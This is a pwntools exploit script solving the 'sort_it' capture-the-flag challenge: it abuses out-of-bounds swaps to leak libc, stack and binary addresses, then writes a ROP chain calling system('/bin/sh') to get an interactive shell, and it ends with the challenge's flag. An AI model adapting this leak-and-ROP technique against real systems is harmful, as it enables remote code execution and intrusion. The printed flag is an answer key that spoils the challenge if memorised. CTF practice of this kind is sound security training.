from pwn import *

pop_rdi = 0x1643
ret = 0x101a

p = process('sort_it')
# p = remote('localhost', 7777)
# p = remote('challenge.nahamcon.com', 31208)
e = ELF('sort_it')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.31.so')

def swap(x, y, s):
    p.sendlineafter(': ', str(x))
    p.sendlineafter(': ', str(y))
    p.sendlineafter(': ', s)

p.sendline()

# Sort
swap(1, 3, 'n')
swap(2, 5, 'n')
swap(3, 4, 'n')
swap(4, 8, 'n')
swap(5, 7, 'n')
swap(6, 9, 'n')
swap(9, 10, 'n')

# libc leak
swap(1, -3, 'n')

p.recvuntil('1. ')
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - libc.symbols['_IO_2_1_stdin_']
print(hex(libc.address))

swap(1, -3, 'n')

# stack leak
swap(10, 11, 'n')

p.recvuntil('10. ')
stack = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x150
print(hex(stack))

swap(10, 11, 'n')

# binary leak
swap(10, 19, b'n'*8 + p64(next(libc.search(b'/bin/sh'))))

p.recvuntil('10. ')
e.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - e.symbols['__libc_csu_init']
print(hex(e.address))

swap(10, 19, b'n'*8 + p64(next(libc.search(b'/bin/sh'))))

# ROP
offset = (e.symbols['yn'] + 0x8 - stack) // 0x8 + 0x1

print('[+] arg')
swap(16, offset, b'n'*8 + p64(e.address + ret))

print('[+] ret')
swap(14, offset, b'n'*8 + p64(e.address + pop_rdi))

print('[+] pop_rdi')
swap(15, offset, b'n'*8 + p64(libc.symbols['system']))

print('[+] system')
swap(17, offset, 'y')

p.interactive()

# flag{150997c12bbc936a1bedfad00053cdb5}